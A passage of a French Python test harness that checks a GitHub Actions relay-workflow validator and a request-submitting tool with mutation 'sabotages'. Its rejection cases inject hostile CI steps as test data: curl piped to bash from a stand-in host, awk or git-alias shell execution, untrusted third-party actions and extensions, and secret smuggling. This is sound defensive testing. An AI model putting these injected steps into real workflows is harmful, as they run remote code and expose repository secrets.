            manque = [n for n, ko in (
                (f"code {c} au lieu de 2", c != 2),
                ("« rien ne dit si c'est une course » absent", "rien ne dit si c'est une course" not in o),
                (f"{o.count('poussée refusée (essai')} refus affiché(s) au lieu de 1", o.count("poussée refusée (essai") != 1),
                ("poussé au public", pointe_publique("main") != avant_m)) if ko]
            if manque:
                faux.append("D14 branche illisible après le refus : " + " ; ".join(manque))
            # D15 (N1, N2 du RELU du 25-11-2026) : un refus LONG, une adresse à accès FACTICE au début et une autre à la
            # fin : affiché du début à la fin (une coupe d'un côté ou de l'autre se voit), et les DEUX adresses masquées.
            open(crochet, "w").write("#!/bin/sh\necho 'DEBUT DU REFUS https://ACCESUN@a.invalid/d' >&2\necho '"
                                     + "y" * 300 + "' >&2\necho 'https://ACCESDEUX@b.invalid/d FIN DU REFUS' >&2\nexit 1\n")
            os.chmod(crochet, 0o755)
            c, o = deposer("main", "circuit=examen", "--pousser")
            os.remove(crochet)
            manque = [n for n, ko in (
                ("début du refus absent", "DEBUT DU REFUS" not in o),
                ("fin du refus absente", "FIN DU REFUS" not in o),
                ("première adresse en clair", "ACCESUN" in o),
                ("seconde adresse en clair", "ACCESDEUX" in o),
                ("première adresse masquée absente", "https://***@a.invalid" not in o),
                ("seconde adresse masquée absente", "https://***@b.invalid" not in o),
                (f"code {c} au lieu de 2", c != 2)) if ko]
            if manque:
                faux.append("D15 refus long : " + " ; ".join(manque))
            # D16 (superviseur R-759 du 25-11-2026, point 6) : l'examen SANS RÉPONSE dans le délai → rien de conclu,
            # code 2, rien poussé ; jamais code 1 (« demande refusée »). L'examen lance « git » sans « -C » ; DEPOSER
            # toujours avec : un « git » d'essai placé en tête du PATH ne ralentit (4 s, délai 2 s) que l'examen.
            lent = os.path.join(d, "git_lent")
            os.makedirs(lent, exist_ok=True)
            open(os.path.join(lent, "git"), "w").write("#!/bin/sh\n[ \"$1\" = \"-C\" ] || sleep 4\nexec '"
                                                       + shutil.which("git") + "' \"$@\"\n")
            os.chmod(os.path.join(lent, "git"), 0o755)
            avant_m = pointe_publique("main")
            c, o = lancer([sys.executable, "-B", depose, clone_d, "main", "circuit=examen", "--pousser",
                           "--prive=" + prive], env=dict(GIT_ENV, DEPOSER_DELAI_DE_GIT_EN_SECONDES="2",
                                                         PATH=lent + os.pathsep + GIT_ENV.get("PATH", "")))
            manque = [n for n, ko in (
                (f"code {c} au lieu de 2", c != 2),
                ("« examen sans réponse » absent", "examen sans réponse" not in o),
                ("poussé au public", pointe_publique("main") != avant_m)) if ko]
            if manque:
                faux.append("D16 examen sans réponse : " + " ; ".join(manque))
            avant_m = pointe_publique("main")
            c, o = deposer("main", "circuit=examen")
            if c != 0 or "EXAMINEE, NON POUSSEE" not in o or pointe_publique("main") != avant_m:
                faux.append(f"D8 sans --pousser : rien ne doit partir : code {c} : {o[-300:]}")
        # L : la lecture des arguments par le joueur et le rassembleur
        base = ["r", "tests/E.py", "tests/resultats/R.txt", "--part=0", "--nb-parts=2", "--travail=t"]
        for nom, args in (("L1 --lot donné deux fois (NV-2)", base + ["--lot=13", "--lot=11"]),
                          ("L2 --lot absent", base)):
            try:
                J.lire_les_arguments(args)
                faux.append(f"{nom} : accepté par le joueur")
            except ValueError:
                pass
        try:
            R.lire_les_arguments(["r", "e", "x", "--depuis=a", "--depuis=b", "--travail=t"])
            faux.append("L3 --depuis donné deux fois : accepté par le rassembleur")
        except ValueError:
            pass
        # F : le filet du fabricant
        def filet(nom, gabarits, raison):
            """Range parmi les cas faux un gabarit que le filet ne juge pas comme attendu.

            ① RÔLE — Juger un cas F.
            ② CONTEXTE D'APPEL — `tour`, pour chaque cas F.
            ③ ENTRÉE — `nom` ; `gabarits` : {nom : texte} ; `raison` : None (doit être accepté) ou un fragment du refus attendu.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — Aucune valeur : ajoute à `faux`. [rend: rien]
            ⑥ TRAITEMENT — appelle `verifier_les_gabarits_publics` du fabricant éprouvé.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Chaque refus doit l'être pour SA raison (même motif que `refus`).
            ⑨ CE QUI CLOCHE — Le circuit du soir est passé vide : ses identités ne sont pas confrontées ici (l'épreuve du circuit public le fait).
            ⑩ EFFET — Ajoute à la liste `faux` du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            try:
                F.verifier_les_gabarits_publics(gabarits, "")
                vu = "accepté"
            except ValueError as e:
                vu = str(e)
            if (raison is None and vu != "accepté") or (raison is not None and raison not in vu):
                faux.append(f"{nom} : {vu[:160]}")

        tous = {"certification": F.CERTIFICATION, "series": F.SERIES, "relais": F.RELAIS, "epreuves": F.EPREUVES}
        filet("F0 gabarits fabriqués", tous, None)
        cle = "          GH_TOKEN: ${{ github.token }}\n"
        for nom, ancien, nouveau, raison in (
                ("F1 relais + une ligne qui porte la clé", cle, cle + "          J: ${{ secrets.JETON_DEPOTS }}\n",
                 "octet pour octet"),
                ("F2 relais + ${{ }} dans son script", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          echo ${{ github.ref_name }}\n", "octet pour octet"),
                ("F3 relais + un programme du dépôt", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          python3 programmes/X.py\n", "octet pour octet"),
                ("F4 relais + defaults:", "jobs:\n  relayer:\n",
                 "defaults:\n  shell: bash\njobs:\n  relayer:\n", "octet pour octet"),
                # tour 2 (I-2) : un cas par propriété de `verifier_un_relais`, chacun refusé pour SA raison
                ("F7 relais + un clonage du dépôt privé", "          persist-credentials: false\n",
                 "          persist-credentials: false\n          repository: " + F.DEPOT_PRIVE + "\n",
                 "octet pour octet"),
                ("F8 relais + run: sans bloc", "      - name: Lire la demande",
                 "      - name: X\n        shell: bash\n        run: echo x\n      - name: Lire la demande", "octet pour octet"),
                ("F9 relais + un pas run sans shell: bash", "      - name: Lire la demande",
                 "      - name: X\n        run: |\n          echo x\n      - name: Lire la demande", "octet pour octet"),
                ("F10 relais + GITHUB_ENV", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          echo X=1 >> \"$GITHUB_ENV\"\n", "octet pour octet"),
                ("F11 relais + une poussée", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          git push origin HEAD\n", "octet pour octet"),
                ("F12 second job aux pas indentés de huit (relecteur du tour 1, B1)", "jobs:\n  relayer:\n",
                 "jobs:\n  autre:\n    runs-on: ubuntu-latest\n    steps:\n        - name: X\n          shell: bash\n"
                 "          run: |\n            python3 programmes/X.py ${{ github.event.head_commit.message }}\n"
                 "  relayer:\n", "octet pour octet"),
                ("F13 relais + la clé écrite par un échappement YAML", "      - name: Lire la demande",
                 '      - name: "\\x73ecrets.JETON"\n        shell: bash\n        run: |\n          echo x\n'
                 "      - name: Lire la demande", "octet pour octet"),
                ("F14 relais + permissions au niveau du job", "    timeout-minutes: 10\n",
                 "    timeout-minutes: 10\n    permissions:\n      contents: write\n", "octet pour octet")):
            if F.RELAIS.count(ancien) != 1:
                faux.append(f"{nom} : texte cible trouvé {F.RELAIS.count(ancien)} fois dans le relais")
                continue
            filet(nom, dict(tous, relais=F.RELAIS.replace(ancien, nouveau)), raison)
        filet("F5 séries + actions: write", dict(tous, series=F.SERIES.replace(
            "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  actions: write\n", 1)),
            "octet pour octet")   # refusé par la condition du relais (`verifier_un_relais`) : ce n'est pas le relais
        filet("F6 séries + motif tapé HISTORIQUE_LONG (NV-1)", dict(tous, series=F.SERIES.replace(
            "          codes=", '          motif="HISTORIQUE_LONG"\n          codes=', 1)), "il nomme l'épreuve")
        # A (tour 3, superviseur R-759 du 08-11-2026) : ses essais, un second job ajouté au relais fabriqué ; chacun
        # REFUSÉ par l'empreinte (avant ce tour, A3, A4, A9, A10, A11, A13 et A5 passaient la liste de commandes)
        bis = lambda corps: F.RELAIS.rstrip("\n") + "\n  bis:\n    runs-on: ubuntu-latest\n    steps:\n" + corps
        for nom, texte in (
                ("A1 uses tiers", bis("      - uses: evil/act@v1\n")),
                ("A2 curl|bash", bis("      - shell: bash\n        run: |\n          curl -s https://x.example/p | bash\n")),
                ("A3 awk system", bis("      - shell: bash\n        run: |\n          awk 'BEGIN{system(\"curl x | bash\")}'\n")),
                ("A4 git alias !", bis("      - shell: bash\n        run: |\n          git -c alias.z='!curl x | bash' z\n")),
                ("A5 gh api et message du commit", bis("      - shell: bash\n        env:\n          M: ${{ github.event.head_commit.message }}\n"
                                                     "        run: |\n          gh api -X POST repos/x/y/issues -f body=\"$M\"\n")),
                ("A9 gh extension install", bis("      - shell: bash\n        run: |\n          gh extension install evil/gh-x && gh x\n")),
                ("A10 checkout tiers en flux + tar", bis("      - uses: actions/checkout@v5\n        with: {repository: evil/r, path: e}\n"
                                                       "      - shell: bash\n        run: |\n          tar -xf e/a.tar --to-command='sh -c x'\n")),
                ("A11 runs-on self-hosted", bis("      - shell: bash\n        run: |\n          true\n").replace(
                    "  bis:\n    runs-on: ubuntu-latest", "  bis:\n    runs-on: self-hosted")),
                ("A13 git core.pager", bis("      - shell: bash\n        run: |\n          git config --global core.pager 'sh -c x'; git log\n")),
                ("A14 une espace en fin de fichier", F.RELAIS + " ")):
            try:
                F.verifier_un_relais("demande_de_serie.yml", texte)
                faux.append(f"{nom} : relais modifié ACCEPTÉ")
            except ValueError as e:
                if "octet pour octet" not in str(e):
                    faux.append(f"{nom} : refusé pour une autre raison : {e}")
        try:
            F.verifier_un_relais("demande_de_serie.yml", F.RELAIS)
        except ValueError as e:
            faux.append(f"A0 le relais fabriqué refusé : {e}")
        # R (tour 3) : la permission de lancer, dans les circuits d'un clone public ; (fichier, texte, refusé ?)
        rel = os.path.basename(F.CIRCUIT_RELAIS)
        for nom, fichiers, attendu in (
                ("R1 les circuits fabriqués", {rel: F.RELAIS, "series_longues.yml": F.SERIES,
                                               "certifier_la_version.yml": F.CERTIFICATION}, 0),
                ("R2 le relais modifié", {rel: F.RELAIS.replace("timeout-minutes: 10", "timeout-minutes: 11")}, 1),
                ("R3 un autre circuit avec actions: write", {"autre.yml": "on: push\npermissions: {actions: write}\n"}, 1),
                ("R4 write-all", {"autre.yml": "on: push\npermissions: write-all\n"}, 1),
                ("R5 « actions »: « write » entre guillemets", {"autre.yaml": 'permissions:\n  "actions": "write"\n'}, 1),
                ("R6 une copie exacte du relais sous un autre nom", {"copie.yml": F.RELAIS}, 1),
                # tour 4 (Cowork, tour 3) : N9 un circuit sans « permissions: » ; N11 la casse
                ("R7 un circuit sans permissions: (réglage du dépôt)", {"autre.yml": "on: push\njobs: {}\n"}, 1),
                ("R8 « Actions: Write » en majuscules", {"autre.yml": "on: push\npermissions:\n  Actions: Write\n"}, 1)):
            pub = tempfile.mkdtemp(prefix="public_r_", dir=d)
            os.makedirs(os.path.join(pub, ".github", "workflows"))
            for f, texte in fichiers.items():
                open(os.path.join(pub, ".github", "workflows", f), "w", encoding="utf-8").write(texte)
            vu = F.refus_des_circuits_publies(pub)
            if len(vu) != attendu:
                faux.append(f"{nom} : {len(vu)} refus, {attendu} attendu(s) : {vu}")
    except Exception as e:   # noqa: BLE001 — une erreur imprévue est un cas faux, jamais un passage
        faux.append(f"erreur imprévue : {type(e).__name__} : {e}")
    finally:
        shutil.rmtree(d, ignore_errors=True)
    return faux


# LES SABOTAGES : un par passage, chacun intervertit deux valeurs (ou retire une garde) ; (fichier, ancien, nouveau)
# appliqués dans l'ordre à une copie ; chaque « ancien » doit s'y trouver exactement une fois.
SABOTAGES = {
    # A-811 (15-11-2026) : la pointe — son motif, son obligation, sa transmission, son unicité
    "S70_pointe_sans_motif": [(FABRICANT, '''              [[ "$valeur" =~ """ + MOTIF_DE_POINTE + """ ]] ||''',
                               '''              true ||''')],
    "S71_pointe_non_exigee": [(FABRICANT, '''[ "$CIRCUIT" != "series" ] || [ "$BRANCHE" = "main" ] || [ -n "$POINTE" ] ||''',
                               '''true ||''')],
    "S72_pointe_non_transmise": [(FABRICANT, '''-f "pointe=$POINTE" -f "serie=''', '''-f "serie=''')],
    "S54_pointe_des_epreuves_non_transmise": [(FABRICANT, '''-f "pointe=$POINTE" -f "epreuves=''', '''-f "epreuves=''')],
    "S73_pointe_deux_fois_admise": [(FABRICANT, '''              [[ "$vus" != *" pointe "* ]] ||''', '''              true ||''')],
    "S01_table_les_deux_series_echangent_leur_code": [
        (TABLE, '"code": "HL"', '"code": "TMP"'), (TABLE, '"code": "Yahoo"', '"code": "HL"'),
        (TABLE, '"code": "TMP"', '"code": "Yahoo"')],
    "S02_relais_parts_et_lot_intervertis_vers_gh": [
        (FABRICANT, '''-f "parts_%(m)s=$PARTS_%(M)s" -f "lot_%(m)s=$LOT_%(M)s''',
         '''-f "parts_%(m)s=$LOT_%(M)s" -f "lot_%(m)s=$PARTS_%(M)s''')],
    "S03_relais_lecture_parts_et_lot_intervertis": [
        (FABRICANT, '''              PARTS_%(M)s="$valeur"''', '''              TMP_%(M)s="$valeur"'''),
        (FABRICANT, '''              LOT_%(M)s="$valeur"''', '''              PARTS_%(M)s="$valeur"'''),
        (FABRICANT, '''              TMP_%(M)s="$valeur"''', '''              LOT_%(M)s="$valeur"''')],
    "S04_relais_defauts_intervertis": [
        (FABRICANT, '''          PARTS_%(M)s=%(n)d
          LOT_%(M)s=%(l)d''', '''          PARTS_%(M)s=%(l)d
          LOT_%(M)s=%(n)d''')],
    # Ancre reprise le 15-11-2026 (GHUB ②, D1 du RELU de Cowork) : le relais lance aussi le circuit des épreuves avec
    # `-f "version=$BRANCHE"` ; l'ancre porte « -f "serie=$SERIE" », qui n'est que dans le lancement des SÉRIES.
    "S05_relais_version_toujours_main": [(FABRICANT, '''-f "version=$BRANCHE" -f "pointe=$POINTE" -f "serie=$SERIE''',
                                          '''-f "version=main" -f "pointe=$POINTE" -f "serie=$SERIE''')],
    "S06_matrice_entrees_parts_et_lot_interverties": [
        (FABRICANT, '"          PARTS_%s: ${{ inputs.parts_%s }}\\n          LOT_%s: ${{ inputs.lot_%s }}\\n"',
         '"          PARTS_%s: ${{ inputs.lot_%s }}\\n          LOT_%s: ${{ inputs.parts_%s }}\\n"')],
    "S07_matrice_n_et_l_intervertis": [
        (FABRICANT, '''n="${!vp}"; l="${!vl}"''', '''n="${!vl}"; l="${!vp}"''')],
    "S08_matrice_epreuves_interverties": [
        (FABRICANT, '''.value.serie_du_circuit.code == $c)''', '''.value.serie_du_circuit.code != $c)''')],
    "S09_jouer_nb_et_lot_intervertis": [
        (FABRICANT, '''          NB: ${{ matrix.nb_parts }}
          LOT: ${{ matrix.lot }}''', '''          NB: ${{ matrix.lot }}
          LOT: ${{ matrix.nb_parts }}''')],
    "S10_jouer_lot_donne_deux_fois_NV2": [
        (FABRICANT, '''--lot="$LOT" --parallele''', '''--lot="$LOT" --lot="$NB" --parallele''')],
    "S11_joueur_lit_nb_parts_et_lot_intervertis": [
        (JOUEUR, '''"nb_parts": int(opt["nb-parts"]), "lot": int(opt["lot"])''',
         '''"nb_parts": int(opt["lot"]), "lot": int(opt["nb-parts"])''')],
    "S12_joueur_accepte_une_option_en_double": [(JOUEUR, "        if nom in opt:\n", "        if False:\n")],
    "S13_rassembler_epreuve_et_releve_intervertis": [
        (FABRICANT, '''          EPREUVE: ${{ matrix.epreuve }}
          RELEVE: ${{ matrix.releve }}
          SERIE: ${{ matrix.serie }}''', '''          EPREUVE: ${{ matrix.releve }}
          RELEVE: ${{ matrix.epreuve }}
          SERIE: ${{ matrix.serie }}''')],
    "S14_rassembleur_lit_epreuve_et_releve_intervertis": [
        (RASSEMBLEUR, '''"epreuve": pos[1], "releve": pos[2],''', '''"epreuve": pos[2], "releve": pos[1],''')],
    "S15_relais_sans_controle_ascii": [(FABRICANT, '''          [ "$hors" = "0" ] ||''', '''          true ||''')],
    "S16_relais_accepte_une_cle_en_double": [(FABRICANT, '''            [[ "$vus" != *" $cle "* ]] ||''',
                                              '''            true ||''')],
    "S17_relais_sans_controle_un_seul_fichier": [
        (FABRICANT, '''          [ "$(printf '%s\\\\n' "$changes" | grep -c .)" = "1" ] ||''', '''          true ||''')],
    "S18_relais_sans_controle_un_seul_commit": [(FABRICANT, '''          [ "$parent" = "$AVANT" ] ||''',
                                                 '''          true ||''')],
    "S20_relais_a_blanc_ignore": [(FABRICANT, '''if [ "$(cat "$D/demande/a_blanc")" = "oui" ]; then''',
                                   '''if [ "$(cat "$D/demande/a_blanc")" = "jamais" ]; then''')],
    # étape FILE-2 (20-11-2026) : S19 REMET LE REFUS GLOBAL (l'état d'avant : refuser dès qu'un passage long est en
    # cours) ; S74, S75 et S78, les règles du choix des places ; S77, la file propre du relais
    "S19_relais_remet_le_refus_global": [
        (FABRICANT, '''            done
            M=""" + str(PLACES_LONGUES) + """''', '''            done
            [ ! -s "$D/passages" ] || { echo "::error::DEMANDE REFUSEE : passage(s) en cours ou en attente"; exit 1; }
            M=""" + str(PLACES_LONGUES) + """''')],
    "S74_relais_toujours_premiere_place_1": [
        (FABRICANT, '''if [ -z "$meilleure" ] || [ "$somme" -lt "$meilleure" ]; then''', '''if [ -z "$meilleure" ]; then''')],
    # S75 reciblé le 25-11-2026 (fusion) : les places passent par un tableau commun aux trois circuits
    "S75_relais_places_non_transmises_aux_series": [
        (FABRICANT, '''            PLACES=(-f "premiere_place=$PREMIERE" -f "nombre_de_places=$NOMBRE")''',
         '''            PLACES=()''')],
    # D-2 de Cowork : le motif du titre qui laisse passer « 08 » (lu en octal, le compte de charge s'arrête)
    "S79_relais_titre_a_zero_de_tete": [(FABRICANT, '''places\\\\ ([1-9][0-9]?)\\\\+([1-9][0-9]{0,2})$''',
                                         '''places\\\\ ([0-9]{1,2})\\\\+([0-9]{1,3})$''')],
    # S77 reciblé le 25-11-2026 : le groupe du relais est écrit par GROUPE_DU_RELAIS
    "S77_relais_sans_file_propre": [(FABRICANT, '''  group: """ + GROUPE_DU_RELAIS + """
  cancel-in-progress: false
  queue: max''', '''  group: """ + GROUPE_DU_RELAIS + """
  cancel-in-progress: false''')],
    "S78_relais_fenetre_sans_tour": [(FABRICANT, '''somme=$(( somme + charge[(p - 1 + i) % M + 1] ))''',
                                      '''somme=$(( somme + charge[p + i] ))''')],
    "S21_filet_actions_write_sans_condition": [(FABRICANT, "                verifier_un_relais(nom, texte)    #",
                                                "                pass    #")],
    "S22_filet_sans_les_souches_NV1": [(FABRICANT, "            if souche in texte:\n", "            if False:\n")],
    # tour 2 (relecture du 08-11-2026) : I-1, m-2, m-3, et une propriété de `verifier_un_relais` par sabotage (I-2)
    # S23 reciblé le 20-11-2026 (étape FILE-2, E-1 de Cowork) : la même propriété — les défauts DÉCLARÉS du bouton,
    # machines et lot, ne sont pas intervertis (cas V0) — écrite depuis c1e4d396d (A-896, E4, 18-11-2026) par
    # `_ENTREE_D_UNE_SERIE` ; l'ancienne cible, absente depuis, rendait le code 2 à toute la série (certificat de nuit)
    "S23_bouton_defauts_machines_et_lot_intervertis": [
        (FABRICANT, '_ENTREE_D_UNE_SERIE[e] % {"c": c, "m": c.lower(), "n": n, "l": l}',
         '_ENTREE_D_UNE_SERIE[e] % {"c": c, "m": c.lower(), "n": l, "l": n}')],
    "S24_rassembler_depuis_et_travail_intervertis": [
        (FABRICANT, '--depuis="$RUNNER_TEMP/parts" --travail="$RUNNER_TEMP/rassemble"',
         '--depuis="$RUNNER_TEMP/rassemble" --travail="$RUNNER_TEMP/parts"')],
    "S25_rassembleur_lit_depuis_et_travail_intervertis": [
        (RASSEMBLEUR, '"depuis": os.path.realpath(opt["depuis"]), "travail": os.path.realpath(opt["travail"]),',
         '"depuis": os.path.realpath(opt["travail"]), "travail": os.path.realpath(opt["depuis"]),')],
    "S26_relais_accepte_une_serie_non_jouee": [
        (FABRICANT, '[ "$SERIE" != "%(t)s" ] && [ "$SERIE" != "%(c)s" ]; then', '[ "$SERIE" = "jamais" ]; then')],
    # tour 3 (superviseur R-759 du 08-11-2026, « ARRÊTER ET SIMPLIFIER ») : les sabotages S27 à S36 du tour 2 visaient
    # la liste de commandes et la lecture de structure de `verifier_un_relais`, retirées ; à leur place, la propriété
    "S27_empreinte_du_relais_non_verifiee": [
        (FABRICANT, "    if EMPREINTE_DU_RELAIS is None or vue != EMPREINTE_DU_RELAIS:", "    if False:")],
    "S28_permission_de_lancer_admise_sous_tout_nom": [
        (FABRICANT, "            if f != os.path.basename(CIRCUIT_RELAIS):", "            if False:")],
    "S29_write_all_non_vu": [(FABRICANT, r"""write\b|\bwrite-all\b""", r"""write\b""")],
    "S30_circuits_publies_non_lus": [(FABRICANT, "        if not PERMISSION_DE_LANCER.search(texte):", "        if True:")],
    # l'examen à la demande (08-11-2026, 18h06) : séries et examen intervertis dans la table du relais ; l'examen admis
    # hors de main ; le compte des passages toujours pris sur le circuit des séries
    "S38_relais_series_et_examen_intervertis": [
        (FABRICANT, '(("series", os.path.basename(CIRCUIT_SERIES), MOTIF_DE_VERSION),\n                      ("examen", os.path.basename(CIRCUIT_CERTIFICATION), "^main$"),',
         '(("series", os.path.basename(CIRCUIT_CERTIFICATION), MOTIF_DE_VERSION),\n                      ("examen", os.path.basename(CIRCUIT_SERIES), "^main$"),')],
    "S39_relais_examen_depuis_toute_version": [
        (FABRICANT, '("examen", os.path.basename(CIRCUIT_CERTIFICATION), "^main$")',
         '("examen", os.path.basename(CIRCUIT_CERTIFICATION), MOTIF_DE_VERSION)')],
    "S40_relais_compte_toujours_les_series": [
        (FABRICANT, 'gh run list --workflow "$F" --limit 100', 'gh run list --workflow series_longues.yml --limit 100')],
    # 15-11-2026 (GHUB ②) : les gardes du circuit « epreuve » du relais
    "S48_relais_liste_d_epreuves_non_transmise": [(FABRICANT, '-f "epreuves=$EPREUVES"', '-f "epreuves=toutes"')],
    "S49_relais_ne_compte_pas_le_groupe": [
        (FABRICANT, "CIRCUITS_DU_GROUPE_LONG = (os.path.basename(CIRCUIT_SERIES), os.path.basename(CIRCUIT_EPREUVES),\n",
         "CIRCUITS_DU_GROUPE_LONG = (os.path.basename(CIRCUIT_EPREUVES),\n")],
    "S50_relais_admet_une_epreuve_inconnue": [
        (FABRICANT, '''" == *" $c "* ]] || { echo "::error::DEMANDE REFUSEE : epreuve inconnue''',
         '''" == *" $c "* ]] || true || { echo "::error::DEMANDE REFUSEE : epreuve inconnue''')],
    "S51_relais_epreuve_sans_pointe_admise": [
        (FABRICANT, '''            [ "$BRANCHE" = "main" ] || [ -n "$POINTE" ] || { echo "::error::DEMANDE REFUSEE : la cle pointe manque''',
         '''            true || { echo "::error::DEMANDE REFUSEE : la cle pointe manque''')],
    "S52_relais_epreuve_en_double_admise": [(FABRICANT, '''[[ "$deja" != *" $c "* ]] ||''', '''true ||''')],
    "S53_matrice_des_epreuves_dans_l_ordre_de_la_table": [
        (JOUEUR_D_EPREUVE, '        codes = liste.split(",")\n', '        codes = [c for c in table if c in liste.split(",")]\n')],
    # tour 3 : les sabotages de Cowork du tour 2 qui ne mordaient pas (C3, C5, C7), et N5 / N6
    "S41_relais_1000_octets_refuses_C3": [(FABRICANT, '[ "$taille" -le """', '[ "$taille" -lt """')],
    "S42_relais_un_seul_commit_clone_C5": [(FABRICANT, "          fetch-depth: 2\n          persist-credentials: false\n",
                                            "          fetch-depth: 1\n          persist-credentials: false\n")],
    "S44_relais_sur_pull_request_target_N5": [(FABRICANT, 'on:\n  push:\n    paths:\n      - "demandes/**"',
                                               'on:\n  pull_request_target:\n    paths:\n      - "demandes/**"')],
    "S45_relais_emploie_gh_api_N6": [(FABRICANT, '          mapfile -t ARGS < "$D/demande/args"\n',
                                       '          gh api repos/x/y/actions/runs\n          mapfile -t ARGS < "$D/demande/args"\n')],
    "S46_circuit_sans_permissions_admis_N9": [(FABRICANT, '        if not re.search(r"^permissions:", texte, re.M):   # N9',
                                               '        if False:   # N9')],
    "S47_casse_de_la_permission_non_vue_N11": [(FABRICANT, 'write\\b|\\bwrite-all\\b""", re.I)', 'write\\b|\\bwrite-all\\b""")')],
    # 18-11-2026 (A-897/A-898, troisième superviseur R-759) : la clé version, l'âge du nom, le lancement, la file de
    # GitHub (groupe fixe, « queue: max » du relais et de la fiche visée), le bouton, l'identifiant dans le titre
    "S80_version_non_exigee": [(FABRICANT, '''          [ -n "$VERSION" ] ||''', '''          true ||''')],
    "S81_version_d_une_autre_branche_admise": [(FABRICANT, '''          [ "$VERSION" = "$BRANCHE" ] ||''', '''          true ||''')],
    "S82_age_non_controle": [(FABRICANT, '''          [ $(( $(date +%s) - quand )) -le """''', '''          true || [ $(( $(date +%s) - quand )) -le """''')],
    "S83_futur_admis": [(FABRICANT, '''          [ $(( quand - $(date +%s) )) -le """''', '''          true || [ $(( quand - $(date +%s) )) -le """''')],
    "S84_lancement_refuse_vert": [(FABRICANT, '''gh workflow run "${ARGS[@]}" "${PLACES[@]}" -f "demande=$id" || {''',
                                   '''gh workflow run "${ARGS[@]}" "${PLACES[@]}" -f "demande=$id" || true || {''')],
    "S85_groupe_par_branche": [(FABRICANT, '''  group: """ + GROUPE_DU_RELAIS + """''',
                                '''  group: """ + GROUPE_DU_RELAIS + """-${{ github.ref_name }}''')],
    "S86_queue_max_retiree_du_relais": [(FABRICANT, '''  cancel-in-progress: false
  queue: max
permissions:
  contents: read
  actions: write''', '''  cancel-in-progress: false
permissions:
  contents: read
  actions: write''')],
    "S87_queue_max_de_la_fiche_visee_non_lue": [(FABRICANT, '''"$S/fiche" || { echo "::error::DEMANDE REFUSEE : la fiche du circuit $FICHIER sur cette branche n'est pas une file''',
                                                 '''"$S/fiche" || true || { echo "::error::DEMANDE REFUSEE : la fiche du circuit $FICHIER sur cette branche n'est pas une file''')],
    "S88_queue_max_lue_hors_de_concurrency": [(FABRICANT, '''dans && /^  queue: max[[:space:]]*$/''', '''/^  queue: max[[:space:]]*$/''')],
    "S89_bouton_sans_le_parent": [(FABRICANT, '''            AVANT=$(git rev-parse -q --verify "$APRES^1") ||''', '''            AVANT="$APRES" ||''')],
    "S90_titre_sans_l_identifiant": [(FABRICANT, '''-f "demande=$id" || {''', '''-f "demande=$BRANCHE" || {''')],
    "S91_fiche_absente_admise": [(FABRICANT, '''git show "$APRES:.github/workflows/$FICHIER" > "$S/fiche" 2>/dev/null || {''',
                                  '''git show "$APRES:.github/workflows/$FICHIER" > "$S/fiche" 2>/dev/null || true || {''')],
    # 25-11-2026 (point T1 du RELU de travail-file-demandes) : le groupe neuf du relais, et l'examen du relais de la
    # branche ; (T4) « cancel-in-progress: true » refusé
    "S102_ancien_nom_de_groupe_remis": [(FABRICANT, '''GROUPE_DU_RELAIS = "demande-de-serie-en-file"''',
                                         '''GROUPE_DU_RELAIS = "demande-de-serie"''')],
    "S103_relais_sans_file_accepte": [(FABRICANT, '''"$S/relais" || { echo "::error::DEMANDE REFUSEE : le relais de cette branche''',
                                       '''"$S/relais" || true || { echo "::error::DEMANDE REFUSEE : le relais de cette branche''')],
    "S104_groupe_du_relais_non_lu": [(FABRICANT, '''(groupe == \\"\\" || nomme)''', '''(1 || nomme)''')],
    "S105_cancel_in_progress_true_admis": [(FABRICANT, '''file && !annule &&''', '''file &&''')],
    "S106_relais_de_la_branche_non_lu": [(FABRICANT, '''git show "$APRES:""" + CIRCUIT_RELAIS.replace(os.sep, "/") + """" > "$S/relais"''',
                                          '''git show "$APRES:""" + CIRCUIT_RELAIS.replace(os.sep, "/") + """" > "$S/relais"; cp "$S/fiche" "$S/relais"''')],
    # programmes/DEPOSER_UNE_DEMANDE.py
    "S96_deposer_sans_examen": [(DEPOSEUR, "        if not accepte:\n", "        if False:\n")],
    "S97_deposer_pointe_de_main": [(DEPOSEUR, """["git", "ls-remote", prive, "refs/heads/" + branche]""",
                                    """["git", "ls-remote", prive, "refs/heads/main"]""")],
    "S98_deposer_pointe_a_la_main_admise": [(DEPOSEUR, """    if "pointe" in cles:""", """    if False:""")],
    "S99_deposer_pousse_sans_option": [(DEPOSEUR, "        if not pousser:\n", "        if False:\n")],
    "S101_deposer_sans_version": [(DEPOSEUR, """f"version={branche}"]""", """]""")],
    # 25-11-2026 (T5, partie sans décision) : le refus tronqué, ou retenté alors que la branche n'a pas avancé
    "S107_deposer_retente_sans_course": [(DEPOSEUR, """        if code_f == 0 and git(clone, "rev-parse", f"refs/remotes/origin/{branche}")[1] == tip:""",
                                          """        if False:""")],
    "S108_deposer_refus_tronque": [(DEPOSEUR, """masquer_les_acces(err)""", """masquer_les_acces(err[-200:])""")],
    # 25-11-2026 (superviseur R-759, point 3) : le refus affiché ne montre aucun accès ; le masque vit dans
    # programmes/FORME_D_UN_JETON.py (masquer_les_acces), jamais dans DEPOSER
    "S109_deposer_adresse_non_masquee": [(JETON, """    return ACCES_DANS_UNE_ADRESSE.sub(b"://***@", octets).decode(""",
                                          """    return octets.decode(""")],
    "S110_deposer_jeton_non_masque": [(JETON, """    octets = MOTIF_DE_JETON.sub(b"***", texte.encode("utf-8", "replace"))""",
                                       """    octets = texte.encode("utf-8", "replace")""")],
    # 25-11-2026 (superviseur R-759, point 4) : la branche « code 2 » du masque illisible
    "S111_deposer_masque_illisible_affiche_en_clair": [(DEPOSEUR, """            return 2\n        print(f"poussée refusée (essai""",
                                                        """            masque = err\n        print(f"poussée refusée (essai""")],
    # 25-11-2026 (RELU du 25-11, C1, C4, N3, N1, N2, E2) : chacun avec son cas (D12 à D15, K11) et sa faute nommée
    "S112_deposer_jamais_retente_meme_en_course": [(DEPOSEUR, """        if code_f == 0 and git(clone, "rev-parse", f"refs/remotes/origin/{branche}")[1] == tip:""",
                                                    """        if True:""")],
    "S113_deposer_poussee_sans_reponse_non_rattrapee": [(DEPOSEUR, """        except subprocess.TimeoutExpired:   # poussée sans réponse (C4)""",
